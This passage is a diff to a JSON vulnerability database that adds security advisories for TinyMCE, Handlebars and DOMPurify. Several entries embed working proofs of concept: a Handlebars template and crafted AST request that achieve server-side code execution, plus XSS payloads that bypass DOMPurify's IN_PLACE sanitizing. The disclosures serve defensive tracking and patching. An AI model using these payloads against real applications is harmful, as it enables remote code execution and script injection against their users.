@@ -2038,6 +2038,29 @@
           ]
         },
         {
+          "atOrAbove": "7.9.3",
+          "below": "7.9.4",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` serialization",
+            "githubID": "GHSA-mf2p-h6hf-fcwm",
+            "CVE": [
+              "CVE-2026-116675"
+            ]
+          },
+          "details": "### Impact\nStored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via elements crafted through the data-mce-object attribute, which are created and executed before sanitization. Impacts users of TinyMCE with the media plugin enabled.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 8.9.3 and TinyMCE 7.9.4 by ensuring that, when using the media plugin, any content created through the data-mce-object attribute is properly sanitized first.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.9.3 or higher.\nUpgrade to TinyMCE 7.9.4 or higher.\n\n### Acknowledgements\nTiny thanks [Fariskhi Vidyan](https://github.com/farisv) and David Vieira Kurz (HiSolutions AG) for their help identifying this vulnerability.",
+          "info": [
+            "https://github.com/tinymce/tinymce/security/advisories/GHSA-mf2p-h6hf-fcwm",
+            "https://github.com/tinymce/tinymce/commit/bd1ab5ef024c648c3f9c0b409e54a6c227c7d8a2",
+            "https://github.com/tinymce/tinymce/releases/tag/8.9.3",
+            "https://www.tiny.cloud/docs/tinymce/7/7.9.4-release-notes/#overview",
+            "https://www.tiny.cloud/docs/tinymce/latest/8.9.3-release-notes/#overview"
+          ]
+        },
+        {
           "atOrAbove": "8.0.0",
           "below": "8.5.1",
           "severity": "high",
@@ -2098,6 +2121,29 @@
             "https://github.com/tinymce/tinymce/security/advisories/GHSA-vg35-5wq7-3x7w",
             "https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview",
             "https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview"
+          ]
+        },
+        {
+          "atOrAbove": "8.5.1",
+          "below": "8.9.3",
+          "severity": "high",
+          "cwe": [
+            "CWE-79"
+          ],
+          "identifiers": {
+            "summary": "TinyMCE Cross-Site Scripting (XSS) vulnerability using media plugin `data-mce-object` serialization",
+            "githubID": "GHSA-mf2p-h6hf-fcwm",
+            "CVE": [
+              "CVE-2026-116675"
+            ]
+          },
+          "details": "### Impact\nStored XSS vulnerability in the media plugin. Attackers can inject malicious scripts via elements crafted through the data-mce-object attribute, which are created and executed before sanitization. Impacts users of TinyMCE with the media plugin enabled.\n\n### Patches\nThis vulnerability has been patched in TinyMCE 8.9.3 and TinyMCE 7.9.4 by ensuring that, when using the media plugin, any content created through the data-mce-object attribute is properly sanitized first.\n\n### Workarounds\nNo official workaround available.\n\n### Fix\nTo avoid this vulnerability:\n\nUpgrade to TinyMCE 8.9.3 or higher.\nUpgrade to TinyMCE 7.9.4 or higher.\n\n### Acknowledgements\nTiny thanks [Fariskhi Vidyan](https://github.com/farisv) and David Vieira Kurz (HiSolutions AG) for their help identifying this vulnerability.",
+          "info": [
+            "https://github.com/tinymce/tinymce/security/advisories/GHSA-mf2p-h6hf-fcwm",
+            "https://github.com/tinymce/tinymce/commit/bd1ab5ef024c648c3f9c0b409e54a6c227c7d8a2",
+            "https://github.com/tinymce/tinymce/releases/tag/8.9.3",
+            "https://www.tiny.cloud/docs/tinymce/7/7.9.4-release-notes/#overview",
+            "https://www.tiny.cloud/docs/tinymce/latest/8.9.3-release-notes/#overview"
           ]
         }
       ],
@@ -5144,6 +5190,74 @@
             "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-7rx3-28cr-v5wh",
             "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.9"
           ]
+        },
+        {
+          "atOrAbove": "3.0.0",
+          "below": "4.7.10",
+          "severity": "critical",
+          "cwe": [
+            "CWE-1289",
+            "CWE-184"
+          ],
+          "identifiers": {
+            "summary": "Handlebars: JavaScript Injection via Own Property Check Bypass",
+            "githubID": "GHSA-p8wg-vrv2-v86f",
+            "CVE": [
+              "CVE-2026-106445"
+            ]
+          },
+          "details": "## Summary\n\nHandlebars can expose the `Function` constructor despite its prototype-access deny list. When a template reaches `Function.prototype`, its own `constructor` property is returned before the deny list is checked. An attacker who can render a controlled template with `allowProtoMethodsByDefault: true` can inject and execute arbitrary JavaScript, leading to Remote Code Execution on the server.\n\n## Description\n\n`lookupProperty` trusts own properties:\n\n```js\nif (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n  return result;\n}\n```\n\nNormally, prototype-derived values reach `resultIsAllowed`, which blocks dangerous method names such as `constructor`. However, `constructor` is itself an own property of prototype objects:\n\n```js\nFunction.prototype.constructor === Function;\nString.prototype.constructor === String;\nObject.prototype.constructor === Object;\n```\n\nAs a result, once a template reaches `Function.prototype`, looking up `constructor` returns `Function` without consulting the deny list.\n\n## Proof of Concept\n\nAn attacker needs to reach any prototype object where constructor is an own property, then access constructor to obtain Function. The shortest path requires only an accessible function in the template context:\n\n1. Access a function's prototype: {{lookup myFunction \"proto\"}} resolves to Function.prototype. The proto property is not in the deny list and is permitted when allowProtoMethodsByDefault is true (since the result is a function).\n2. Access constructor via own property bypass: {{lookup (lookup myFunction \"\\_\\_proto__\") \"constructor\"}} resolves to Function. Because Function.prototype.constructor is an own property of Function.prototype, hasOwnProperty returns true and lookupProperty returns the value without calling resultIsAllowed. The deny list entry constructor: false is never evaluated.\n3. Construct and execute arbitrary code: The attacker uses Function to create a function with attacker-controlled body content and triggers its execution through Handlebars' template rendering mechanics (e.g., #with calling functions, lambda processing, or #each iteration combined with apply).\n\n```javascript\nconst Handlebars = require('handlebars');\n\n// constructor deny list bypass via hasOwnProperty check in lookupProperty\nconst template = Handlebars.compile(\n    // construct code array from template string literal\n    '{{#with a}}' +\n      '{{lookup \"\" (push \"return process.mainModule.require(\\'child_process\\').execSync(\\'id\\').toString()\")}}' +\n      '{{lookup \"\" (pop)}}' +\n      '{{lookup \"\" (shift)}}' +\n    '{{/with}}' +\n\n    // access Function via own property bypass on Function.prototype.constructor\n    '{{lookup \"\" (@root.a.push (lookup (lookup fn \"__proto__\") \"constructor\"))}}' +\n\n    // #each sets depth0=Function without calling it, apply avoids hash body\n    '{{#each @root}}{{#if @index}}{{else}}' +\n      '{{#with (this.apply null @root.a)}}{{this}}{{/with}}' +\n    '{{/if}}{{/each}}'\n);\n\nconst result = template(\n    { fn: function(){}, a: [0] },\n    { allowProtoMethodsByDefault: true }\n);\n\nconsole.log(result.trim());\n\n// output: uid=1000(node) gid=1000(node) groups=1000(node)\n```\n\n## Workarounds\n\nDo not set `allowProtoMethodsByDefault: true` when compiling untrusted templates with untrusted data.",
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-p8wg-vrv2-v86f",
+            "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+            "https://github.com/handlebars-lang/handlebars.js/commit/ceec388abe1d1aac8f6369860d5f390fa71ef4fa",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+          ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.10",
+          "severity": "critical",
+          "cwe": [
+            "CWE-843",
+            "CWE-94"
+          ],
+          "identifiers": {
+            "summary": "Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)",
+            "githubID": "GHSA-8r5x-fm3f-whwj",
+            "CVE": [
+              "CVE-2026-106446"
+            ]
+          },
+          "details": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from other places and writes them into the generated code as-is:\n\n| AST value | Written into generated code as | Compile options needed |\n| --- | --- | --- |\n| `Program.blockParams.length` | `container.program(<index>, data, <length>)` | none (default options) |\n| `depth` on a param that is not a `PathExpression`, e.g. a `StringLiteral` | `depths[<depth>]` | `stringParams: true` |\n| A `StringLiteral.value` that is not a string | raw JavaScript literal | `stringParams: true` |\n| A `PathExpression.original` that is not a string | raw JavaScript literal | `stringParams: true` |\n\nThe first row works with default options. A `Program` with `blockParams: { \"length\": \"<JS expression>\" }` passes validation because:\n\n1. the `blockParams` object has no `type`, so none of the type-specific checks apply, and\n2. the walker skips the string under `length` because it is not an object.\n\nThe compiler then reads `program.blockParams.length` and writes the string directly into the template function. The `container.program(...)` call is part of the helper options object, which is built before the helper is looked up. The code therefore runs on render even if the block's helper does not exist.\n\n## Proof of Concept\n\n1. Start a server that compiles request input:\n\n```js\nimport express from \"express\";\nimport Handlebars from \"handlebars\";\n\nconst app = express();\napp.use(express.json());\n\napp.post(\"/api/render\", (req, res) => {\n  const template = Handlebars.compile(req.body.text); // `text` may be an object, not a string\n  res.send(template());\n});\n\napp.listen(2123);\n```\n\n2. Save this request body as `poc.json`. `missingHelper` does not need to exist:\n\n```json\n{\n  \"text\": {\n    \"type\": \"Program\",\n    \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } },\n    \"body\": [\n      {\n        \"type\": \"BlockStatement\",\n        \"path\": {\n          \"type\": \"PathExpression\", \"data\": false, \"depth\": 0,\n          \"parts\": [\"missingHelper\"], \"original\": \"missingHelper\",\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"params\": [],\n        \"program\": {\n          \"type\": \"Program\",\n          \"blockParams\": {\n            \"length\": \"(()=>{throw new Error('Injected code ran as uid ' + process.getuid())})()\"\n          },\n          \"body\": [],\n          \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n        },\n        \"openStrip\": { \"open\": false, \"close\": false },\n        \"inverseStrip\": { \"open\": false, \"close\": false },\n        \"closeStrip\": { \"open\": false, \"close\": false },\n        \"loc\": { \"start\": { \"line\": 1, \"column\": 0 } }\n      }\n    ]\n  }\n}\n```\n\n3. Send the request:\n\n```sh\ncurl -s -X POST 'http://127.0.0.1:2123/api/render' \\\n     -H 'Content-Type: application/json' --data-binary @poc.json\n```\n\nThe server responds with HTTP 500 and an error page showing the injected code ran inside the Node.js process:\n\n```\nError: Injected code ran as uid 1000\n```\n\n## Impact\n\nAn application is affected if untrusted input can reach `Handlebars.compile()` or `Handlebars.precompile()` as an object instead of a string. A common way this happens is passing a field from a JSON request body straight to `compile()`.\n\n- **`compile()`**: arbitrary JavaScript runs in the Node.js process with the application's privileges (remote code execution).\n- **`precompile()`**: the injected code is written into the precompiled template and runs wherever that template is loaded, for example in users' browsers.\n\n\n## Workarounds\n\n- **Validate input type** before calling `Handlebars.compile()`: ensure the argument is always a  `string`, never a plain object or JSON-deserialized value.\n  ```javascript\n  if (typeof templateInput !== 'string') {\n    throw new TypeError('Template must be a string');\n  }\n  ```\n- Use the Handlebars **runtime-only** build (`handlebars/runtime`) on the server if templates are  pre-compiled at build time; `compile()` will be unavailable.\n\n## Credits\n\n### Variant `Program.blockParams`\n- [Nick Mykhailyshyn - @whoareme](https://x.com/whoareme33)\n- [jmoritzc53 ](https://github.com/jmoritzc53)\n- [bhaswanthc ](https://github.com/bhaswanthc)\n- [dinhvaren ](https://github.com/dinhvaren)\n- [n0tra4e ](https://github.com/n0tra4e) \n- [PellaML](https://github.com/PellaML)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [sanmatte](https://github.com/sanmatte)\n\n### Variant `BooleanLiteral|NumberLiteral.value`\n\n- [sondt99 ](https://github.com/sondt99) Thai Son Dinh from VinSOC Labs (R&D)\n- [Ahmed-Elmahgob ](https://github.com/Ahmed-Elmahgob)\n- [nikolakojic-rasit ](https://github.com/nikolakojic-rasit)\n- [vk-can](https://github.com/vk-can)\n- [shenhuanageshei](https://github.com/shenhuanageshei)\n- [kustundag](https://github.com/kustundag)\n- [kagebunsher](https://github.com/kagebunsher)\n- [ffasterss](https://github.com/ffasterss)\n\n### Variant `PathExpression.depth`\n\n- [hibrian827](https://github.com/hibrian827) Team Atlanta\n- [oss-security-shopify](https://github.com/oss-security-shopify)",
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-8r5x-fm3f-whwj",
+            "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+            "https://github.com/handlebars-lang/handlebars.js/commit/703fdcc5fd6cc8d1cc0c33cc19de40c467c4b8d2",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+          ]
+        },
+        {
+          "atOrAbove": "4.0.0",
+          "below": "4.7.10",
+          "severity": "medium",
+          "cwe": [
+            "CWE-116"
+          ],
+          "identifiers": {
+            "summary": "Handlebars: JavaScript Injection via Unsafe Inline Embedding of Precompiled Templates",
+            "githubID": "GHSA-xw65-4hp5-5hc7",
+            "CVE": [
+              "CVE-2026-106444"
+            ]
+          },
+          "details": "## Summary\n\n`Handlebars.precompile()` generates JavaScript source that is commonly embedded in browser `<script>` elements. Before the fix, static template text containing `</script>` was emitted unchanged. HTML parsers recognize `</script>` even inside a JavaScript string literal, closing the surrounding script element and allowing following attacker-controlled markup to be parsed and executed.\n\nThis affects applications that precompile attacker-controlled templates and embed the generated source directly in an HTML `<script>` element. It does not affect ordinary server-side rendering or precompiled templates delivered as external JavaScript files.\n\n## Details\n\nStatic text is serialized by `quotedString()` in `lib/handlebars/compiler/code-gen.js`. The generated JavaScript is valid, but JavaScript quoting alone does not make it safe to embed in HTML. In HTML script data, the sequence `</script>` terminates the element regardless of JavaScript string context.\n\nOn affected releases, this template:\n\n```handlebars\nsafe</script><script>alert(\"XSS\")</script><script>\n```\n\ncould produce generated source containing:\n\n```js\nreturn 'safe</script><script>alert(\"XSS\")</script><script>';\n```\n\nWhen included inline in an HTML document, the first `</script>` closes the script containing the precompiled template. The next `<script>` element is then parsed as HTML and executes.\n\n## Proof of Concept\n\n```js\nconst Handlebars = require('handlebars');\n\nconst template = 'safe</script><script>alert(\"XSS\")</script><script>';\nconst output = Handlebars.precompile(template);\n\nconsole.log(output.includes('</script>'));\n```\n\nAffected versions print `true`. Embedding `output` directly in an inline `<script>` element allows the injected script tag to be parsed by the browser.\n\n## Workarounds\n\n- Do not inline precompiled output from untrusted templates into HTML documents.\n- Serve generated precompiled templates as external JavaScript files where practical.\n\n## Credits\n\nReported by Curly-Haired-Baboon Aka Laplas",
+          "info": [
+            "https://github.com/handlebars-lang/handlebars.js/security/advisories/GHSA-xw65-4hp5-5hc7",
+            "https://github.com/handlebars-lang/handlebars.js/pull/2185",
+            "https://github.com/handlebars-lang/handlebars.js/commit/609d1b11c833c9a3e00f56f2f34d22f425446725",
+            "https://github.com/handlebars-lang/handlebars.js/releases/tag/v4.7.10"
+          ]
         }
       ],
       "extractors": {
@@ -6241,7 +6355,10 @@
           ],
           "identifiers": {
             "summary": "DOMPurify: IN_PLACE returns a force-removed rawtext root whose text carries attacker markup — pure HTML reparse executes",
-            "githubID": "GHSA-6688-9rhm-gjv2"
+            "githubID": "GHSA-6688-9rhm-gjv2",
+            "CVE": [
+              "CVE-2026-109345"
+            ]
           },
           "details": "## Environment\n\n- dompurify 3.4.15 (current npm release); reproduced independently on jsdom 30.0.1 and 29.1.1 (Node.js 20.x / 26.x)\n- Config: `DOMPurify.sanitize(node, { IN_PLACE: true })` on a Node input; `SAFE_FOR_XML` at its default (`true`)\n\n## Summary\n\nThe 3.4.9 fix for the IN_PLACE detached-root class added two protections on the IN_PLACE return path: a fail-closed `TypeError` in `_forceRemove` when a node selected for removal cannot be detached, and a `_neutralizeSubtree` pass (`dist/purify.js` line 1336) that strips non-allowlisted **attributes** from removed subtrees.\n\nBoth miss the rawtext **text-content** form. When the force-removed root is a rawtext element (`<style>`), the payload lives in the node's *text*: the node detaches fine (the `TypeError` guard is not reached), `_neutralizeSubtree` strips nothing (there are no attributes), and the IN_PLACE exit returns the detached, never-sanitized `<style>` whose text still carries live markup. Serializing that node and re-parsing it in **plain HTML context** materializes the payload — no foreign-content context required.\n\nThe same Node input sanitized **without** `IN_PLACE` returns an empty result: the only difference is the IN_PLACE return path handing the killed node back.\n\n## Steps to reproduce\n\n```js\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');   // 3.4.15\n\nconst window = new JSDOM('').window;\nconst DOMPurify = createDOMPurify(window);\n\nconst styleRoot = window.document.createElement('style');\nstyleRoot.setAttribute('onclick', 'alert(1)');    // attribute payload\nstyleRoot.textContent = '</style><img src=x onerror=1>';  // text payload\nwindow.document.body.appendChild(styleRoot);\n\nconst returned = DOMPurify.sanitize(styleRoot, { IN_PLACE: true });\n\nconsole.log(returned === styleRoot);                       // true (same node)\nconsole.log(styleRoot.parentNode === null);                // true (detached)\nconsole.log(styleRoot.outerHTML);\n// <style></style><img src=x onerror=1></style>\nconsole.log(styleRoot.getAttribute('onclick'));            // null  (attribute neutralized)\nconsole.log(styleRoot.textContent);                        // '</style><img src=x onerror=1>' (text survives)\n\n// plain HTML reparse (no foreign-content context involved):\nconst probe = window.document.createElement('div');\nprobe.innerHTML = returned.outerHTML || styleRoot.outerHTML;\nconsole.log(probe.querySelectorAll('img').length);         // 1\nconsole.log(probe.querySelector('img').getAttribute('onerror')); // \"1\"\n```\n\nObserved on 3.4.15: one node, one call — the `onclick` **attribute** is neutralized while the **text** payload (`</style><img src=x onerror=1>`) survives verbatim; serializing and re-parsing the returned node in plain HTML context materializes the `img` with the live `onerror` handler.\n\nContrast on the same Node input without `IN_PLACE`: `RETURN_DOM: true` → `<body></body>`; `RETURN_DOM_FRAGMENT: true` → 0 children — the payload is fully sanitized away. The only difference is the IN_PLACE return path.\n\nContrast on the removal trigger: `SAFE_FOR_XML: false` → the node is not removed (detached stays false); plain CSS text → not removed. The removal is gated by the mXSS text probes and happens *specifically because* the serialized node would re-open tags on reparse.\n\n## Root cause\n\n`_isUnsafeNode` (`dist/purify.js` 3.4.15, lines 1700–1714) removes nodes whose literal text would re-open tags on reparse — shape (b) in the source comment is \"text-only content that already carries the element's OWN end tag\", detected by the `LITERAL_TEXT_CLOSE` probe (line 385) alongside the `ELEMENT_MARKUP_PROBE` (line 339) rules. `_forceRemove` (line 1122) records the node in `DOMPurify.removed` (`{element}`) and detaches it. The removal is intentional: the upstream comment states these shapes are removed **because the literal serializer emits them verbatim for the HTML parser to re-open**.\n\nThe IN_PLACE exit then hands the force-removed root back to the caller — the very node whose removal `DOMPurify.removed` just recorded (verified: `DOMPurify.removed.some(e => e.element === root)` is `true` on the returned instance). The 3.4.9 `_neutralizeSubtree` pass (line 1336) addresses only the attribute form — its own docstring: \"walks a removed subtree and strips every attribute\" (purpose: cancel queued resource events). Rawtext text content is out of its scope, so the removal that was performed *specifically to prevent reparse* is undone by returning the node: you removed it to stop the reparse, then returned it.\n\nDifferential (one node, one call, same removal path): the `onclick` attribute is neutralized by the existing pass while the text payload survives verbatim — the attribute axis is covered, the text axis is the gap.\n\n## Impact\n\nIdentical blast radius to the published IN_PLACE family: an application that sanitizes a Node in `IN_PLACE` mode and re-inserts (or serializes and then re-inserts) the result materializes attacker markup in plain HTML context: script execution in the page. Moving the returned node via `appendChild` alone is safe; the round trip through serialization is what fires the payload. No foreign-content context is required with the close-tag payload.\n\n## Affected versions\n\n- Verified live: 3.4.15 (current).\n- Source-verified: the attribute-only `_neutralizeSubtree` and the IN_PLACE return path are present in 3.4.9–3.4.14; releases before 3.4.9 predate the fix entirely (unconditional return; individual pre-3.4.9 releases not dynamically tested).\n- Per cure53 advisory convention the affected range is reported as `<= 3.4.15` (current at time of writing).\n\n## Suggested remediation\n\n**Primary (root-cause, covers every form):** at the IN_PLACE exit, check whether the returned root was recorded during sanitization — `DOMPurify.removed.some(e => e.element === root)` — and fail closed: throw the same `TypeError` style used by the 3.4.9 detach guard (\"a node selected for removal could not be safely returned; refusing to sanitize in place\"), or return `null`. This is consistent with the existing fail-closed design and covers all present and future root-kill reasons in one check.\n\n**Secondary (form-specific):** extend `_neutralizeSubtree` to neutralize **text content of rawtext descendants** — the elements in `LITERAL_TEXT_ELEMENT_NAMES` (`style`, `script`, `xmp`, `iframe`, `noembed`, `noframes`, `plaintext`, `noscript`) — by rewriting `textContent` to a defanged form, matching the probe coverage of `_isUnsafeNode`/`LITERAL_TEXT_CLOSE`.\n\nA regression test asserting that a force-removed rawtext root comes back with no `/<[/\\w!]/` match in `textContent` (and is not returned at all under the primary fix) prevents re-introduction.\n\n## Prior art / differentiation\n\n- GHSA-r47g-fvhr-h676 (fixed 3.4.6): clobbered-form **root** removal — different trigger; this report's root is a normal allowlisted `style` element killed by the text probe.\n- GHSA-55q2-fjhq-7xh7 (low): IN_PLACE **hook removal** leaves a detached subtree executable — the attribute-form twin (hook-stripped subtree retains onload-class handlers). This report's rawtext **text** form is not covered by `_neutralizeSubtree`'s attribute stripping and is not that advisory.\n- GHSA-h8r8-wccr-v5f2 (medium): mXSS via re-contextualization in the standard (non-IN_PLACE) serialize path — different mechanism; IN_PLACE is not involved.\n- The 3.4.9 release notes credit @mozfreedyb for the IN_PLACE handling improvements that this residual escapes on the text axis.\n\n## Applicability scope (stated up front)\n\nThe payload materializes when the application **serializes and re-parses** the sanitizer output (`innerHTML` assignment, template rendering, markdown/HTML round trips) or otherwise consumes the returned node's markup. Moving the returned node via `appendChild` alone does not trigger it. Applications that pass **live, connected attacker trees** into `IN_PLACE` are explicitly warned against by upstream's own source comment; this report concerns the serialize-and-reinsert consumption pattern that the IN_PLACE mode exists to serve.",
           "info": [
@@ -6260,7 +6377,10 @@
           ],
           "identifiers": {
             "summary": "DOMPurify: IN_PLACE: node-removing afterSanitize hook leaves detached subtree event handlers armed, causing DOM XSS",
-            "githubID": "GHSA-p98j-92pf-mc4p"
+            "githubID": "GHSA-p98j-92pf-mc4p",
+            "CVE": [
+              "CVE-2026-109344"
+            ]
           },
           "details": "## Summary\n\nIn `IN_PLACE` mode DOMPurify sanitizes the caller's live DOM subtree directly. To close a known hazard (GHSA-55q2-fjhq-7xh7), the library neutralizes any node a hook detaches during sanitization by stripping its subtree's non-allow-listed attributes, but this neutralization is wired only into the `beforeSanitizeElements` and `uponSanitizeElement` hook sites. An `afterSanitizeElements` or `afterSanitizeAttributes` hook that removes a non-root element (a documented, supported pattern) detaches that element's subtree with no neutralization, so descendant `on*` handlers remain armed on the caller's live tree after `sanitize()` returns, yielding DOM XSS. No special privilege is required beyond supplying markup to an application that uses `IN_PLACE` together with a node-removing afterSanitize hook.\n\n## Root Cause\n\n`IN_PLACE` sanitization mutates the caller's live document, so any element a hook detaches from that tree must have its subtree neutralized before `sanitize()` returns; otherwise a queued resource-event handler (for example an `<img onerror>` that began loading when the caller built the tree) fires in page scope even though the handler never reached the sanitized output. The guard helper `_handleHookDetachedNode` (which calls `_neutralizeSubtree` in `IN_PLACE`) is invoked only after `beforeSanitizeElements` and after `uponSanitizeElement`. It is never invoked from the afterSanitize return paths, and `_sanitizeAttributes` never calls it at all. The post-walk `IN_PLACE` neutralization pass iterates only `DOMPurify.removed`, and hook-detached nodes are intentionally not recorded there, so that pass cannot reach them either.\n\n```text\nsrc/purify.ts\n  _sanitizeElements: _handleHookDetachedNode present at lines 2142 and 2175\n    (before/upon), absent after afterSanitizeElements at lines 2208 and 2249.\n  _sanitizeAttributes: afterSanitizeAttributes fires at line 2670 with no\n    detach re-check; the function never calls _handleHookDetachedNode.\n  Post-walk IN_PLACE pass (lines 3081-3090) iterates DOMPurify.removed only,\n    which by design (comment at lines 2096-2099) excludes hook-detached nodes.\n```\n\n## Impact\n\nAn attacker who supplies markup processed by a victim application that runs `DOMPurify.sanitize(node, { IN_PLACE: true })` and registers a node-removing `afterSanitizeElements` or `afterSanitizeAttributes` hook can retain arbitrary `on*` event handlers on descendants of a removed non-root element. Because `IN_PLACE` operates on the caller's live document, a queued resource-event handler on such a descendant fires in the page origin after the synchronous `sanitize()` call returns, giving script execution in the victim's session (DOM XSS). This defeats DOMPurify's `IN_PLACE` contract to neutralize handlers on subtrees removed from the live tree. The capability is script execution in the victim origin; exact confidentiality and integrity effects depend on the hosting application's session.\n\n## Proof of Concept\n\n```text\nDependencies: Node.js and jsdom. The harness builds a live tree, registers a\nremoval hook, runs IN_PLACE sanitize(), then inspects whether the attacker\nonerror handler survives on the detached descendant. jsdom does not perform\nreal image loads, so the retained handler (rather than an actual fired event)\nis the observed hazard; the retained on* attribute on a live detached node\nafter a synchronous sanitize() return is the neutralization failure.\n```\n\nReproduction steps:\n1. Build a live subtree `#root > section#wrap > img[onerror]` where `#root` is the walk root and `section#wrap` is a non-root wrapper.\n2. Register an `afterSanitizeElements` (or `afterSanitizeAttributes`) hook that calls `node.remove()` on the wrapper.\n3. Call `DOMPurify.sanitize(root, { IN_PLACE: true })`.\n4. Observe that the descendant `<img>` retains its `onerror` handler, whereas the same removal performed in a `beforeSanitizeElements`/`uponSanitizeElement` hook strips it.\n\n```javascript\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');\nconst { window } = new JSDOM('<!DOCTYPE html><body></body>');\nconst DOMPurify = createDOMPurify(window);\n\nconst root = window.document.createElement('div');\nroot.id = 'root';\nroot.innerHTML = '<section id=\"wrap\"><img src=\"x\" onerror=\"ATTACKER()\"></section>';\nwindow.document.body.appendChild(root);\n\nDOMPurify.addHook('afterSanitizeElements', (node) => {\n  if (node.id === 'wrap') node.remove();\n});\nDOMPurify.sanitize(root, { IN_PLACE: true });\n\n// The detached <img> still carries its onerror handler:\nconsole.log(root.querySelector('#wrap') === null,               // true (removed from live tree)\n            !!window.document.querySelector('img[onerror]') ||  // handler survives on the detached node\n            root.innerHTML);\n```\n\n```text\nPASS: beforeSanitizeElements detach neutralizes descendant onerror (control)\nPASS: uponSanitizeElement detach neutralizes descendant onerror (control)\nPASS: without a removal hook the descendant onerror is stripped normally\nPASS: afterSanitizeElements detach LEAVES descendant onerror armed (GAP)\nPASS: afterSanitizeAttributes detach LEAVES descendant onerror armed (GAP)\nPASS: kept custom element removed in afterSanitizeElements leaves descendant onerror armed (GAP)\n```\n\n## Attack Chain\n\n1. **Exposure:** The victim application calls `DOMPurify.sanitize(liveNode, { IN_PLACE: true })` on attacker-influenced markup and has registered a node-removing `afterSanitizeElements` or `afterSanitizeAttributes` hook per an application policy (`src/purify.ts:3026` walk, `2136` element pass, `2522` attribute pass).\n2. **Control:** The attacker controls the markup, including a non-root wrapper element and, inside it, a descendant carrying an `on*` resource-event handler such as `<img src=x onerror=...>`.\n3. **Path:** The pre-order walk visits the wrapper before its descendants. During the wrapper's element or attribute pass the application hook detaches the wrapper from the live tree.\n4. **Guard:** The detach-neutralization guard `_handleHookDetachedNode` runs only after `beforeSanitizeElements` (`2142`) and `uponSanitizeElement` (`2175`); it is absent after `afterSanitizeElements` (`2208`, `2249`) and is never called by `_sanitizeAttributes` (afterSanitizeAttributes at `2670`). The NodeIterator advances past the detached subtree, so the descendants are never revisited, and the post-walk pass iterates only `DOMPurify.removed`, which excludes hook-detached nodes.\n5. **Primitive:** The descendant retains its `on*` handler on the caller's live document after `sanitize()` returns.\n6. **Result:** The queued resource event fires the attacker handler in the victim page origin, achieving DOM XSS despite `IN_PLACE` sanitization.\n\n## Bypass Evidence\n\nThe relevant prior fix is GHSA-55q2-fjhq-7xh7 (\"IN_PLACE hook removal leaves a detached subtree executable, causing XSS\"), whose change (`#1557`) added `_neutralizeSubtree` at the `beforeSanitizeElements` and `uponSanitizeElement` detach sites. Inspection of that change shows it touches no afterSanitize site: the diff adds the neutralization only at the before/upon locations, later refactored into `_handleHookDetachedNode` at `src/purify.ts:2142` and `2175`. A subsequent hardening change (`#1616`) added a `rootWasRemoved` throw and a neutralization sweep over `DOMPurify.removed`, but that sweep still iterates only `DOMPurify.removed`, which by design excludes hook-detached non-root nodes, so it does not close this gap. The `afterSanitizeElements`-on-kept-custom-element site at `2208` was itself introduced by the fix for GHSA-c2j3-45gr-mqc4 (`#1527`), adding another uncovered hook site.\n\nDisproof attempts, all failed: (a) that a later release closed the afterSanitize gap, refuted by inspecting the published 3.4.13, 3.4.14, and 3.4.15 artifacts; (b) that detached descendants are revisited or re-sanitized, refuted at runtime (the `onerror` is retained only at the afterSanitize sites and stripped at the before/upon sites and with no removal hook); (c) that the post-walk pass catches hook-detached nodes, refuted by the design that excludes them from `DOMPurify.removed`; (d) that the precondition is contrived, refuted by parity with the accepted GHSA-55q2 threat model and the library's own supported pattern of removing a node inside `afterSanitizeElements`. The only edge not directly executed is the browser resource-event dispatch (jsdom performs no real image load); it is established by the proven retention of the live handler after a synchronous return, the library's own comments describing exactly this hazard, and parity with the accepted GHSA-55q2 mechanism.\n\n## Affected Versions\n\n- `Ecosystem: npm`\n- `Package: dompurify`\n- `Confirmed affected range: >= 3.4.13, <= 3.4.15`\n- `Latest release checked: 3.4.15 (npm registry)`\n- `Fix status: fixed in 3.4.16`\n\nThe before/upon detach neutralization introduced for GHSA-55q2-fjhq-7xh7 first shipped in 3.4.13; the residual afterSanitize gap was verified by reproducing it against the published npm artifacts for 3.4.13, 3.4.14, and 